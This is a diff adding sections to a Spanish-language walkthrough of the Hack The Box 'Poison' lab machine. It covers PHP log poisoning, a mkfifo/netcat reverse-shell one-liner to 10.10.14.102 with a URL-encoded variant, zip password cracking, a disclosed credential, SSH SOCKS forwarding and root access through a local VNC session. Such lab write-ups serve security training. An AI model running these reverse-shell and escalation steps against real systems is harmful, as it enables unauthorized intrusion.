@@ -94,6 +94,107 @@ Podriamos embenenar el log.
 
 ```
 
+### Log Poison 
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/04001dca-e70e-49a3-95e6-0d8fe73d8539)
+
+Ahora si ponemos ese cmd en el log como intenta interpretar php nos permite ejecutar comandos. Algo importante fijate como no usas el ? si no el & porque lo trata como parametro.
+
+### Netcat una version antigua que no tiene el -e activado
+
+Ahi en monkeypentester existe una opcion de netcat que no requiere el -e. RECUERDA LOS AMPERSANT SIEMPRE JODEN REMPLAZALOS POR %26.
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.102 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.102 1234 >/tmp/f
+```
+
+Con el %26 (URL encode del &) 
+
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/511b1a48-ea10-4721-a42b-8c9a3378db1b)
+
+Como Tarea se podra envenenar ese log de otras maneras ¿?
+
+## RCE2
+
+Tenemos un puerto 22 un usuario y una contraseña nos conectamos por ssh y si se puede esta es otra manera de resolverla.
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/39adbadc-da21-414c-a949-07e7dc69ef83)
+
+Existe un archivo secrets.zip nos lo traemos
+
+```
+zip2jonh > hash
+jonh -w rockyou.txt hash
+fcrackzip
+
+Charix!2#4%6&8(0
+
+```
+
+Pero no esta ahi la contraseña por lo que utilizamos la contraseña del usuario que ya tenemos (siempre prueba la re utilizacion de contraseñas).
+
+
+## Privilege Escalation
+
+Enumeramos un poco la maquina y nos damos cuenta que estan en escucha pero solo local los puertos 5801 y 5901 ( esto lo hice con el linpeas pero igual lo resumi)
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/21a3bf9f-6bd0-4218-ac6e-9adcb7cac5cb)
+
+Enumeramos proceso
+
+```
+ps -faux
+
+```
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/772407c1-0441-4a86-b2e9-4aae064972ea)
+
+
+
+Buscando en internet vemos que esos puertos los  usa el xvnc ( y aparte ese proceso corre como root). Algo importante fijate en el programa tightvnc (paquete investigalo bien)
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/6fe882a9-1925-4acf-aa86-00362885abbf)
+
+Si buscas "Kali Xvnc" nos sale como instalar este paquete que no es mas que un VNC.
+
+### Dynamic portfowarding
+
+Vamos a exponer los puertos que se necesitan para la conexion de la vnc.
+
+
+```
+ssh charix@10.129.1.254 -D 1080
+
+
+```
+
+En la configuracion del proxychains.
+
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/941221e5-6c4a-4032-8b01-1d36ad246fee)
+
+Checamos antes de poner puerto
+
+```
+lsof -i:1080
+#No hay nada pero ya despues si.
+
+```
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/d95ebf72-9831-4ae4-9081-77bf0259e02d)
+
+
+La explicacion es le decimos al proxychains que mande todo por el puerto 1080 como nos conectamos con el -D 1080 esta ligado al puerto de la maquina como creamos un socks4 entonces ahora nos trajimos todos los puertos. Nuesta maquina (proxychains) ---> (-D 1080) Victima --> acceso a todos los puertos. Entonces para usarlos mis puertos en 127.0.0.1:ports serian sus puertos ya sabes.
+
+```
+proxychains xtightvncviewer 127.0.0.1:5901 -passwd secret
+```
+Esto nos lanza una cosola de root y listo.
+
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/58ea5e65-4f1b-4c97-a119-e138d75ca681)
+
+
 
 
 
